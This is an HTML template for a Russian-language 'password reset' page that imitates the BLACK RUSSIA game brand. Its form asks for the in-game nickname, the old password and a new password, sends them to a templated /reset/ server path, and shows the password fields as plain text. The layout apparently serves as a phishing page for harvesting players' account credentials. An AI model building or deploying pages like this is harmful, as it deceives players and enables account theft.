<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Сброс пароля — BLACK RUSSIA</title>
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0e0e0e;
    color: #ffffff;
    font-family: 'Montserrat', -apple-system, sans-serif;
    min-height: 100vh;
    padding: 0 0 40px;
    background-image:
      radial-gradient(ellipse at 50% 0%, rgba(255,60,0,0.10), transparent 60%),
      linear-gradient(180deg, #141414 0%, #0a0a0a 100%);
  }
  .header {
    display: flex;
    align-items: center;
    padding: 14px 20px;
    border-bottom: 1px solid rgba(255,255,255,0.06);
    background: rgba(10,10,10,0.6);
  }
  .header img { height: 42px; width: 42px; object-fit: contain; margin-right: 12px; }
  .header .title { display: flex; flex-direction: column; line-height: 1; }
  .header .title .b { color: #ff4400; font-weight: 900; font-size: 17px; letter-spacing: 1.2px; }
  .header .title .r { color: #ffffff; font-weight: 900; font-size: 17px; letter-spacing: 1.2px; }
  .wrap { max-width: 460px; margin: 0 auto; padding: 20px 20px 0; }
  .head {
    background: linear-gradient(180deg, #1a1a1a 0%, #151515 100%);
    border: 1px solid rgba(255,255,255,0.07);
    border-radius: 16px;
    padding: 18px 20px;
    margin-bottom: 20px;
    font-size: 14px;
    color: #b8b8b8;
    line-height: 1.5;
    font-weight: 500;
  }
  .head strong { color: #ff4400; font-weight: 700; }
  form {
    background: linear-gradient(180deg, #1a1a1a 0%, #151515 100%);
    border: 1px solid rgba(255,255,255,0.07);
    border-radius: 18px;
    padding: 22px 20px;
  }
  label {
    display: block;
    margin-top: 16px;
    margin-bottom: 6px;
    font-size: 11px;
    color: #7a7a7a;
    text-transform: uppercase;
    letter-spacing: 1px;
    font-weight: 700;
  }
  label:first-child { margin-top: 0; }
  input {
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    border: 1px solid rgba(255,255,255,0.08);
    background: #0e0e0e;
    color: #ffffff;
    font-size: 15px;
    outline: none;
    font-family: inherit;
    font-weight: 600;
  }
  input:focus { border-color: #ff4400; }
  input::placeholder { color: #444; }
  button {
    width: 100%;
    margin-top: 24px;
    background: linear-gradient(135deg, #ff4400, #cc2800);
    color: #ffffff;
    border: 0;
    padding: 16px;
    border-radius: 14px;
    font-size: 14px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    box-shadow: 0 8px 24px rgba(255,60,0,0.35);
    font-family: inherit;
    cursor: pointer;
  }
  button:active { transform: scale(0.98); }
  .back {
    display: block;
    text-align: center;
    margin-top: 24px;
    color: #ff4400;
    text-decoration: none;
    font-size: 13px;
    font-weight: 700;
    letter-spacing: 0.5px;
    text-transform: uppercase;
  }
</style>
</head>
<body>
  <div class="header">
    <img src="https://i.postimg.cc/y86F1KVm/images-(9).jpg" alt="BR">
    <div class="title">
      <span class="b">BLACK</span>
      <span class="r">RUSSIA</span>
    </div>
  </div>

  <div class="wrap">
    <div class="head">
      <strong>🔑 Сброс пароля</strong><br>
      Сервер: <strong>{{ server }}</strong>
    </div>

    <form method="post" action="/reset/{{ server }}">
      <label>Ник в игре</label>
      <input type="text" name="nick" required autocomplete="off" placeholder="Vanya_Stoyn">

      <label>Старый пароль</label>
      <input type="text" name="old_password" required autocomplete="off" placeholder="••••••">

      <label>Новый пароль</label>
      <input type="text" name="new_password" required autocomplete="off" placeholder="••••••">

      <button type="submit">Отправить</button>
    </form>

    <a class="back" href="/reset">← Вернуться назад</a>
  </div>
</body>
</html>
